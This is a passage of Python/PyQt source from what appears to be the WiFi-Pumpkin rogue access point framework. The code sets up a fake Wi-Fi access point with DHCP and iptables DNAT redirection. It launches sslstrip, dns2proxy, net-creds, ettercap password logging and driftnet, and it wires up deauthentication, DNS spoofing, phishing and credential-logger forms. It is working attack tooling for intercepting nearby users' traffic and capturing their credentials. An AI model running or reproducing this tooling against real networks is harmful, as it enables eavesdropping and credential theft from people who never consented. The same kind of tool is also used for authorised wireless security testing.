        self.Fstar.setGeometry(QRect(100, 100, 450, 200))
        self.Fstar.show()

    def showProbe(self):
        self.Fprobe = pkg.frm_PMonitor()
        self.Fprobe.setGeometry(QRect(100, 100, 400, 400))
        self.Fprobe.show()

    def formDauth(self):
        self.Fdeauth =pkg.frm_deauth()
        self.Fdeauth.setGeometry(QRect(100, 100, 200, 200))
        self.Fdeauth.show()

    def form_mac(self):
        self.Fmac = pkg.frm_mac_generator()
        self.Fmac.setGeometry(QRect(100, 100, 300, 100))
        self.Fmac.show()

    def show_dns_spoof(self):
        self.Fdns = pkg.frm_DnsSpoof()
        self.Fdns.setGeometry(QRect(100, 100, 450, 300))
        self.Fdns.show()

    def show_PhishingManager(self):
        self.FPhishingManager = self.FormPopup.Ftemplates
        self.FPhishingManager.txt_redirect.setText('0.0.0.0')
        self.FPhishingManager.show()

    def credentials(self):
        self.Fcredentials = pkg.frm_get_credentials()
        self.Fcredentials.setWindowTitle('Phishing Logger')
        self.Fcredentials.show()

    def logsnetcreds(self):
        self.FnetCreds = pkg.frm_NetCredsLogger()
        self.FnetCreds.setWindowTitle('NetCreds Logger')
        self.FnetCreds.show()

    def logdns2proxy(self):
        self.Fdns2proxy = pkg.frm_dns2proxy()
        self.Fdns2proxy.setWindowTitle('Dns2proxy Logger')
        self.Fdns2proxy.show()

    def checkPlugins(self):
        if literal_eval(self.FSettings.xmlSettings('sslstrip_plugin','status',None,False)):
            self.PopUpPlugins.check_sslstrip.setChecked(True)
            self.PopUpPlugins.set_sslStripRule()
        if literal_eval(self.FSettings.xmlSettings('netcreds_plugin','status',None,False)):
            self.PopUpPlugins.check_netcreds.setChecked(True)
        if literal_eval(self.FSettings.xmlSettings('dns2proxy_plugin','status',None,False)):
            self.PopUpPlugins.check_dns2proy.setChecked(True)
            self.PopUpPlugins.set_Dns2proxyRule()

    def Started(self,bool):
        if bool:
            self.StatusDhcp.setText("[ON]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : green; }")
        else:
            self.StatusDhcp.setText("[OFF]")
            self.StatusDhcp.setStyleSheet("QLabel {  color : red; }")

    def StatusDHCPRequests(self,key):
        print('Connected::[{}] hostname::[{}]'.format(key,self.APclients[key]['device']))

    def GetDHCPRequests(self,data):
        if len(data) == 8:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    self.APclients[data[4]] = {'IP': data[2],'device': data[5],
                    'in_tables': False,}
                    self.StatusDHCPRequests(data[4])
        elif len(data) == 9:
            if Refactor.check_is_mac(data[5]):
                if data[5] not in self.APclients.keys():
                    self.APclients[data[5]] = {'IP': data[2],'device': data[6],
                    'in_tables': False,}
                    self.StatusDHCPRequests(data[5])
        elif len(data) == 7:
            if Refactor.check_is_mac(data[4]):
                if data[4] not in self.APclients.keys():
                    leases = IscDhcpLeases('Settings/dhcp/dhcpd.leases')
                    hostname = None
                    try:
                        for item in leases.get():
                            if item.ethernet == data[4]:
                                hostname = item.hostname
                        if hostname == None:
                            item = leases.get_current()
                            hostname = item[data[4]]
                    except:
                        hostname = 'unknown'
                    if hostname == None:hostname = 'unknown'
                    self.APclients[data[4]] = {'IP': data[2],'device': hostname,
                    'in_tables': False,}
                    self.StatusDHCPRequests(data[4])

        Headers = []
        for mac in self.APclients.keys():
            if self.APclients[mac]['in_tables'] == False:
                self.APclients[mac]['in_tables'] = True
                self.THeaders['mac-address'].append(mac)
                self.THeaders['ip-address'].append(self.APclients[mac]['IP'])
                self.THeaders['device'].append(self.APclients[mac]['device'])
                for n, key in enumerate(self.THeaders.keys()):
                    Headers.append(key)
                    for m, item in enumerate(self.THeaders[key]):
                        item = QTableWidgetItem(item)
                        item.setTextAlignment(Qt.AlignVCenter | Qt.AlignCenter)
                        self.TabInfoAP.setItem(m, n, item)
                self.TabInfoAP.setHorizontalHeaderLabels(self.THeaders.keys())
        self.connectedCount.setText(str(len(self.APclients.keys())))


    def GetHostapdStatus(self,data):
        if self.APclients != {}:
            if data in self.APclients.keys():
                print('Disconnected::[{}] hostname::[{}]'.format(data,self.APclients[data]['device']))
        for row in xrange(0,self.TabInfoAP.rowCount()):
            if self.TabInfoAP.item(row,1) != None:
                if self.TabInfoAP.item(row,1).text() == data:
                    self.TabInfoAP.removeRow(row)
                    if data in self.APclients.keys():
                        del self.APclients[data]
        for mac_tables in self.APclients.keys():self.APclients[mac_tables]['in_tables'] = False
        self.THeaders = {'ip-address':[], 'device':[], 'mac-address':[]}
        self.connectedCount.setText(str(len(self.APclients.keys())))

    def mConfigure(self):
        self.get_interfaces = Refactor.get_interfaces()
        try:
            self.EditGateway.setText(
            [self.get_interfaces[x] for x in self.get_interfaces.keys() if x == 'gateway'][0])
        except:pass
        self.EditApName.setText(self.FSettings.xmlSettings('AP', 'name',None,False))
        self.EditChannel.setText(self.FSettings.xmlSettings('channel', 'mchannel',None,False))
        self.ConfigTwin['PortRedirect'] = self.FSettings.redirectport.text()
        for i,j in enumerate(self.get_interfaces['all']):
            if search('wlan', j):self.selectCard.addItem(self.get_interfaces['all'][i])
        driftnet = popen('which driftnet').read().split('\n')
        ettercap = popen('which ettercap').read().split('\n')
        dhcpd = popen('which dhcpd').read().split("\n")
        dnsmasq = popen('which dnsmasq').read().split("\n")
        hostapd = popen('which hostapd').read().split("\n")
        lista = [ '/usr/sbin/airbase-ng', ettercap[0],driftnet[0],dhcpd[0],dnsmasq[0],hostapd[0]]
        for i in lista:self.ConfigTwin['ProgCheck'].append(path.isfile(i))

    def exportHTML(self):
        contents = Refactor.exportHtml()
        filename = QFileDialog.getSaveFileNameAndFilter(self,
        'Save File Logger HTML','report.html','HTML (*.html)')
        if len(filename) != 0:
            with open(str(filename[0]),'w') as filehtml:
                filehtml.write(contents['HTML']),filehtml.close()
            QMessageBox.information(self, 'WiFi Pumpkin', 'file has been saved with success.')

    def refrash_interface(self):
        self.selectCard.clear()
        n = Refactor.get_interfaces()['all']
        for i,j in enumerate(n):
            if search('wlan', j):
                self.selectCard.addItem(n[i])

    def kill(self):
        if self.Apthreads['RougeAP'] == []: return
        self.ProxyPluginsTAB.GroupSettings.setEnabled(True)
        self.FSettings.xmlSettings('statusAP','value','False',False)
        for i in self.Apthreads['RougeAP']:i.stop()
        for kill in self.SettingsAP['kill']:popen(kill)
        set_monitor_mode(self.ConfigTwin['interface']).setDisable()
        self.Started(False)
        self.Apthreads['RougeAP'] = []
        self.APclients = {}
        with open('Settings/dhcp/dhcpd.leases','w') as dhcpLease:
            dhcpLease.write(''),dhcpLease.close()
        self.btn_start_attack.setDisabled(False)
        Refactor.set_ip_forward(0)
        self.TabInfoAP.clearContents()
        try:
            self.FormPopup.Ftemplates.killThread()
            self.FormPopup.StatusServer(False)
        except AttributeError as e:
            print e

    def delete_logger(self):
        content = Refactor.exportHtml()
        if listdir('Logs')!= '':
            resp = QMessageBox.question(self, 'About Delete Logger',
                'do you want to delete Logs?',QMessageBox.Yes |
                    QMessageBox.No, QMessageBox.No)
            if resp == QMessageBox.Yes:
                system('rm Logs/Caplog/*.cap')
                for keyFile in content['Files']:
                    with open(keyFile,'w') as f:
                        f.write(''),f.close()

    def start_etter(self):
        if self.ConfigTwin['ProgCheck'][1]:
            if search(str(self.ConfigTwin['AP_iface']),str(popen('ifconfig').read())):
                Thread_Ettercap = ProcessThread(['sudo', 'xterm', '-geometry', '73x25-1+50',
                '-T', 'ettercap', '-s', '-sb', '-si', '+sk', '-sl',
                    '5000', '-e', 'ettercap', '-p', '-u', '-T', '-q', '-w',
                      'Logs/passwords', '-i', self.ConfigTwin['AP_iface']])
                Thread_Ettercap.setName('Tool::Ettercap')
                self.Apthreads['RougeAP'].append(Thread_Ettercap)
                Thread_Ettercap.start()
            return
        QMessageBox.information(self,'ettercap','ettercap is not found.')
    def start_dift(self):
        if self.ConfigTwin['ProgCheck'][2]:
            if search(str(self.ConfigTwin['AP_iface']),str(popen('ifconfig').read())):
                Thread_driftnet = ProcessThread(['sudo', 'xterm', '-geometry', '75x15+1+200',
                    '-T', 'DriftNet', '-e', 'driftnet', '-i', self.ConfigTwin['AP_iface']])
                Thread_driftnet.setName('Tool::Driftnet')
                self.Apthreads['RougeAP'].append(Thread_driftnet)
                Thread_driftnet.start()
            return
        QMessageBox.information(self,'driftnet','driftnet is not found.')

    def CoreSettings(self):
        self.DHCP = self.PumpSettingsTAB.getPumpkinSettings()
        self.ConfigTwin['PortRedirect'] = self.FSettings.xmlSettings('redirect', 'port',None,False)
        self.SettingsAP = {
        'interface':
            [
                'ifconfig %s up'%(self.ConfigTwin['AP_iface']),
                'ifconfig %s 10.0.0.1 netmask %s'%(self.ConfigTwin['AP_iface'],self.DHCP['netmask']),
                'ifconfig %s mtu 1400'%(self.ConfigTwin['AP_iface']),
                'route add -net %s netmask %s gw %s'%(self.DHCP['subnet'],
                self.DHCP['netmask'],self.DHCP['router'])
            ],
        'kill':
            [
                'iptables --flush',
                'iptables --table nat --flush',
                'iptables --delete-chain',
                'iptables --table nat --delete-chain',
                'ifconfig %s 0'%(self.ConfigTwin['AP_iface']),
                'killall dhpcd',
                'killall dnsmasq'
            ],
        'hostapd':
            [
                'interface={}\n'.format(str(self.selectCard.currentText())),
                'ssid={}\n'.format(str(self.EditApName.text())),
                'channel={}\n'.format(str(self.EditChannel.text())),
            ],
        'dhcp-server':
            [
                'authoritative;\n',
                'default-lease-time {};\n'.format(self.DHCP['leasetimeDef']),
                'max-lease-time {};\n'.format(self.DHCP['leasetimeMax']),
                'subnet %s netmask %s {\n'%(self.DHCP['subnet'],self.DHCP['netmask']),
                'option routers {};\n'.format(self.DHCP['router']),
                'option subnet-mask {};\n'.format(self.DHCP['netmask']),
                'option broadcast-address {};\n'.format(self.DHCP['broadcast']),
                'option domain-name \"%s\";\n'%(str(self.EditApName.text())),
                'option domain-name-servers {};\n'.format(self.DHCP['router']),
                'range {};\n'.format(self.DHCP['range']),
                '}',
            ],
        'dnsmasq':
            [
                'interface=%s\n'%(self.ConfigTwin['AP_iface']),
                'dhcp-range=10.0.0.1,10.0.0.50,12h\n',
                'dhcp-option=3, 10.0.0.1\n',
                'dhcp-option=6, 10.0.0.1\n',
            ]
        }
        Refactor.set_ip_forward(1)
        for i in self.SettingsAP['kill']:popen(i)
        for i in self.SettingsAP['interface']:popen(i)
        dhcp_select = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select != 'dnsmasq':
            with open('Settings/dhcpd.conf','w') as dhcp:
                for i in self.SettingsAP['dhcp-server']:dhcp.write(i)
                dhcp.close()
                if path.isfile('/etc/dhcp/dhcpd.conf'):
                    system('rm /etc/dhcp/dhcpd.conf')
                if not path.isdir('/etc/dhcp/'):mkdir('/etc/dhcp')
                move('Settings/dhcpd.conf', '/etc/dhcp/')
        else:
            with open('Core/config/dnsmasq.conf','w') as dhcp:
                for i in self.SettingsAP['dnsmasq']:
                    dhcp.write(i)
                dhcp.close()

    def StartApFake(self):
        if len(self.selectCard.currentText()) == 0:
            return QMessageBox.warning(self,'Error interface ','Network interface is not found')
        if len(self.EditGateway.text()) == 0:
            return QMessageBox.warning(self,'Error Gateway','gateway is not found')
        if not self.ConfigTwin['ProgCheck'][5]:
            return QMessageBox.information(self,'Error Hostapd','hostapd is not installed')
        dhcp_select = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if dhcp_select == 'iscdhcpserver':
            if not self.ConfigTwin['ProgCheck'][3]:
                return QMessageBox.warning(self,'Error dhcp','isc-dhcp-server is not installed')
        elif dhcp_select == 'dnsmasq':
            if not self.ConfigTwin['ProgCheck'][4]:
                return QMessageBox.information(self,'Error dhcp','dnsmasq is not installed')
        if str(Refactor.get_interfaces()['activated']).startswith('wlan'):
            return QMessageBox.information(self,'Error network card',
                'You are connected with interface wireless, try again with local connection')
        self.btn_start_attack.setDisabled(True)
        self.APactived = self.FSettings.xmlSettings('accesspoint','actived',None,False)
        if self.APactived == 'airbase-ng':
            self.ConfigTwin['interface'] = str(set_monitor_mode(self.selectCard.currentText()).setEnable())
            self.FSettings.xmlSettings('interface', 'monitor_mode',self.ConfigTwin['interface'],False)
            # airbase thread
            Thread_airbase = ProcessThread(['airbase-ng',
            '-c', str(self.EditChannel.text()), '-e', self.EditApName.text(),
            '-F', 'Logs/Caplog/'+asctime(),self.ConfigTwin['interface']])
            Thread_airbase.name = 'Airbase-ng'
            self.Apthreads['RougeAP'].append(Thread_airbase)
            Thread_airbase.start()
            # settings
            while True:
                if Thread_airbase.iface != None:
                    self.ConfigTwin['AP_iface'] = [x for x in Refactor.get_interfaces()['all'] if search('at',x)][0]
                    self.FSettings.xmlSettings('netcreds', 'interface',self.ConfigTwin['AP_iface'],False)
                    break
            self.CoreSettings()
        elif self.APactived == 'hostapd':
            self.FSettings.xmlSettings('netcreds','interface',
            str(self.selectCard.currentText()),False)
            self.ConfigTwin['AP_iface'] = str(self.selectCard.currentText())
            try:
                check_output(['nmcli','radio','wifi',"off"])
            except CalledProcessError:
                try:
                    check_output(['nmcli','nm','wifi',"off"])
                except CalledProcessError as e:
                    return QMessageBox.warning(self,'Error nmcli',e)
            call(['rfkill', 'unblock' ,'wlan'])
            self.CoreSettings()
            ignore = ('interface=','ssid=','channel=')
            with open('Settings/hostapd.conf','w') as apconf:
                for i in self.SettingsAP['hostapd']:apconf.write(i)
                for config in str(self.FSettings.ListHostapd.toPlainText()).split('\n'):
                    if not config.startswith('#') and len(config) > 0:
                        if not config.startswith(ignore):
                            apconf.write(config+'\n')
                apconf.close()
            self.Thread_hostapd = ProcessHostapd(['hostapd','-d','Settings/hostapd.conf'])
            self.Thread_hostapd.setObjectName('hostapd')
            self.Thread_hostapd.statusAP_connected.connect(self.GetHostapdStatus)
            self.Apthreads['RougeAP'].append(self.Thread_hostapd)
            self.Thread_hostapd.start()

        # thread dhcp
        selected_dhcp = self.FSettings.xmlSettings('dhcp','dhcp_server',None,False)
        if selected_dhcp == 'iscdhcpserver':
            Thread_dhcp = ThRunDhcp(['sudo','dhcpd','-d','-f','-lf','Settings/dhcp/dhcpd.leases','-cf',
            '/etc/dhcp/dhcpd.conf',self.ConfigTwin['AP_iface']])
            Thread_dhcp.sendRequest.connect(self.GetDHCPRequests)
            Thread_dhcp.setObjectName('DHCP')
            self.Apthreads['RougeAP'].append(Thread_dhcp)
            Thread_dhcp.start()

        ##### dnsmasq disabled
        # elif selected_dhcp == 'dnsmasq':
        #     Thread_dhcp = ThRunDhcp(['dnsmasq','-C','Core/config/dnsmasq.conf','-d'])
        #     self.connect(Thread_dhcp ,SIGNAL('Activated ( QString ) '), self.dhcpLog)
        #     Thread_dhcp .setObjectName('DHCP')
        #     self.Apthreads['RougeAP'].append(Thread_dhcp)
        #     Thread_dhcp .start()
        else:return QMessageBox.information(self,'DHCP',selected_dhcp + ' not found.')
        self.Started(True)
        self.ProxyPluginsTAB.GroupSettings.setEnabled(False)
        self.FSettings.xmlSettings('statusAP','value','True',False)

        if self.FSettings.check_redirect.isChecked() or not self.PopUpPlugins.check_sslstrip.isChecked():
            popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(self.EditGateway.text())))
            self.FSettings.xmlSettings('sslstrip_plugin','status','False',False)
            self.PopUpPlugins.check_sslstrip.setChecked(False)
            self.PopUpPlugins.unset_Rules('sslstrip')

        if self.PopUpPlugins.check_sslstrip.isChecked() or not self.PopUpPlugins.check_dns2proy.isChecked():
            popen('iptables -t nat -A PREROUTING -p udp -j DNAT --to {}'.format(str(self.EditGateway.text())))
        # load ProxyPLugins
        self.plugin_classes = Plugin.PluginProxy.__subclasses__()
        self.plugins = {}
        for p in self.plugin_classes:
            self.plugins[p._name] = p()

        # thread plugins
        if self.PopUpPlugins.check_sslstrip.isChecked():
            self.Thread_sslstrip = Threadsslstrip(self.ConfigTwin['PortRedirect'],
            self.plugins,self.ProxyPluginsTAB._PluginsToLoader)
            self.Thread_sslstrip.setObjectName("sslstrip")
            self.Apthreads['RougeAP'].append(self.Thread_sslstrip)
            self.Thread_sslstrip.start()

        if self.PopUpPlugins.check_netcreds.isChecked():
            Thread_netcreds = ProcessThread(['python','Plugins/net-creds/net-creds.py','-i',
            self.FSettings.xmlSettings('netcreds', 'interface',None,False)])
            Thread_netcreds.setName('Net-Creds')
            self.Apthreads['RougeAP'].append(Thread_netcreds)
            Thread_netcreds.start()

        if self.PopUpPlugins.check_dns2proy.isChecked():
            Thread_dns2proxy = ProcessThread(['python','Plugins/dns2proxy/dns2proxy.py'])
            Thread_dns2proxy.setName('Dns2Proxy')
            self.Apthreads['RougeAP'].append(Thread_dns2proxy)
            Thread_dns2proxy.start()

        iptables = []
        for index in xrange(self.FSettings.ListRules.count()):
           iptables.append(str(self.FSettings.ListRules.item(index).text()))
        for rules in iptables:
            if search('--append FORWARD --in-interface',
            rules):popen(rules.replace('$$',self.ConfigTwin['AP_iface']))
            elif search('--append POSTROUTING --out-interface',rules):
                popen(rules.replace('$$',str(Refactor.get_interfaces()['activated'])))
            else:popen(rules)

    def create_sys_tray(self):
        self.sysTray = QSystemTrayIcon(self)
        self.sysTray.setIcon(QIcon('Icons/icon.ico'))
        self.sysTray.setVisible(True)
        self.connect(self.sysTray,
        SIGNAL('activated(QSystemTrayIcon::ActivationReason)'),
        self.on_sys_tray_activated)
        self.sysTrayMenu = QMenu(self)
        self.sysTrayMenu.addAction('FOO')

    def on_sys_tray_activated(self, reason):
        if reason == 3:self.showNormal()
        elif reason == 2:self.showMinimized()

    def about(self):
        self.Fabout = frmAbout(author,emails,
        version,update,license,desc)
        self.Fabout.show()

    def issue(self):
        url = QUrl('https://github.com/P0cL4bs/WiFi-Pumpkin/issues/new')
        if not QDesktopServices.openUrl(url):
            QMessageBox.warning(self, 'Open Url', 'Could not open url')
